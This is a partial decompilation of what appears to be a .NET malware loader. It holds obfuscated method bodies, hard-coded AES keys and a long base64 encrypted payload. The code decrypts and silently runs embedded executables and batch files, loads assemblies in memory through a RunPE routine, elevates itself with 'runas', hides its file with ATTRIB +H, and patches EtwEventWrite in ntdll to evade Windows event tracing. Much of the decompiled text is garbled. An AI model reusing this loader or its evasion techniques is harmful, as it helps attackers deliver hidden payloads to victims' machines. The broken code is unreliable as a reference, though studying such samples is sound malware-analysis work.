		 Nested Types
			 Fields
			 Methods
				 Method begins at RVA 0x2bd6c
				 Header size: 12
				 Code size: 7 (0x7)
				 {
				 }
				 Method begins at RVA 0x2bd80
				 Header size: 12
				 Code size: 1531 (0x5fb)
				 string text = Path.GetTempFileName() + ".exe";
				 				 loop start (head: IL_0015)
					 					 return;
					 process = new Process();
					 File.WriteAllBytes(text, transform(decrypt(Convert.FromBase64String(bindedBytes), Convert.FromBase64String("5at8j0kYXTuOaDORi0S7jOj+49wFgSM6wJqcg/DgDMw="), Convert.FromBase64String("nchtzuII+tzEzgZwn5FHTw=="))));
					 process.StartInfo.FileName = text;
					 process.Start();
					 process.WaitForExit();
					 File.Delete(text);
					 File.Delete(text.Replace(".tmp.exe", ".tmp"));
				 end 				 return;
			 Fields
			 Methods
				 Method begins at RVA 0x2c388
				 Header size: 12
				 Code size: 7 (0x7)
				 {
				 }
				 Method begins at RVA 0x2c39c
				 Header size: 12
				 Code size: 1734 (0x6c6)
				 bool flag = (byte)<Module>.574D7F75 != 0;
				 				 loop start (head: IL_0008)
					 					 s = Binded.Replace("[NATIVE]", "");
					 if (Binded.StartsWith("[NATIVE]"))
					 flag = true;
					 s = "";
				 end 				 
				 if (flag)
					 byte[] input = Convert.FromBase64String(s);
					 					 loop start (head: IL_02bf)
						 						 return;
						 						 �\U0001f0d0�\U0001f1af�🕂�🄣.GetType("RunPE.Program")!.GetMethod("Execute")!.Invoke(null, new object[1] { 					 end 					 return;
					 {
					 return;
				 byte[] input2 = Convert.FromBase64String(Binded);
				 				 loop start (head: IL_04c8)
					 					 rawAssembly = transform(decrypt(input2, Convert.FromBase64String("5at8j0kYXTuOaDORi0S7jOj+49wFgSM6wJqcg/DgDMw="), Convert.FromBase64String("nchtzuII+tzEzgZwn5FHTw==")));
				 end 				 MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
					 entryPoint.Invoke(null, new object[1] { �🝢���🄣🍑�� });
					 return;
					 {
					 					 loop start (head: IL_05bb)
						 						 return;
						 entryPoint.Invoke(null, null);
					 return;
			 Fields
			 Methods
				 Method begins at RVA 0x2caa4
				 Header size: 12
				 Code size: 7 (0x7)
				 {
				 }
				 Method begins at RVA 0x2cab8
				 Header size: 12
				 Code size: 1724 (0x6bc)
				 string text = Path.GetTempFileName() + ".bat";
					 process = new Process();
					 File.WriteAllBytes(text, transform(decrypt(Convert.FromBase64String(bindedBytes), Convert.FromBase64String("5at8j0kYXTuOaDORi0S7jOj+49wFgSM6wJqcg/DgDMw="), Convert.FromBase64String("nchtzuII+tzEzgZwn5FHTw=="))));
					 process.StartInfo.FileName = text;
					 process.StartInfo.CreateNoWindow = true;
					 process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					 process.Start();
					 process.WaitForExit();
					 Thread.Sleep(1000);
					 File.Delete(text);
					 File.Delete(text.Replace(".tmp.bat", ".tmp"));
				 return;
		 Fields
		 Methods
		 	This is the method that gets called HERE 
			 Method begins at RVA 0x2628
			 Header size: 12
			 Code size: 7805 (0x1e7d)
			 ProcessStartInfo processStartInfo = new ProcessStartInfo();
			 			
			 processStartInfo.FileName = Path.ChangeExtension(Process.GetCurrentProcess().MainModule!.FileName, null);
			 processStartInfo.Verb = "runas";
			 ProcessStartInfo startInfo = processStartInfo;
			 Process.Start(startInfo);
				 				 
			 Environment.Exit(0);
			 watchdog.Kill();
	
			 �🂶�🃇��🃂��(watchdog);
		
			 Method begins at RVA 0x44d0
			 Header size: 12
			 Code size: 12609 (0x3141)
			 RijndaelManaged rijndaelManaged = new RijndaelManaged();
			 rijndaelManaged.Key = cryptoTransform = rijndaelManaged.CreateDecryptor();
			 source rijndaelManaged.Mode = (CipherMode) 2
		     return cryptoTransform.TransformFinalBlock(input, 0, input.Length);



			 Method begins at RVA 0x7620
			 Header size: 12
			 Code size: 7500 (0x1d4c)
			 Assembly executingAssembly = Assembly.GetExecutingAssembly();
			 Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(filename);
			if (manifestResourceStream == null)
				result = null;
				(no C# code)
				manifestResourceStream.Read
				result = 				 				 				 
				if (manifestResourceStream != null)
					 ((IDisposable)manifestResourceStream).Dispose();
			 return result;




			 Method begins at RVA 0x9394
			 Header size: 12
			 Code size: 42548 (0xa634)
			 Process watchdog = 📇����🕿\U0001f77d🀲();
			 		
			processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = 1
			processStartInfo.WindowStyle = (ProcessWindowStyle) 1
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = "/C ATTRIB +H \"" + Application.get_ExecutablePath() + "\" & exit";
			new Thread(���🖆🆆��💵�).Start();
			Process.Start(processStartInfo);
			hModule = LoadLibrary("ntdll.dll");
			procAddress = GetProcAddress(hModule, "EtwEventWrite");
			VirtualProtect(procAddress, (UIntPtr)(uint)1, 64, out var _);
				 				 				 				 				 				 				 				 			
			(no C# code)
			source = Marshal.Copy(source, 0, procAddress, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
			
				�🂶�🃇��🃂��(watchdog);
				currentProcess = Process.GetCurrentProcess();
		
				text = Path.ChangeExtension(currentProcess.MainModule!.FileName, null);
				flag = �📪�🗍🔟�🖆�(text);
				🜱��💵�📇���(text);
				input2 = �📕�🖒💵�🐲�("PAYLOAD.H1DDEN");
				
				MethodInfo? method = �\U0001f0d0�\U0001f1af�🕂�🄣.GetType("RunPE.Program")!.GetMethod("Execute");
				 method!.Invoke(null, 
				 object[] input = Convert.FromBase64String("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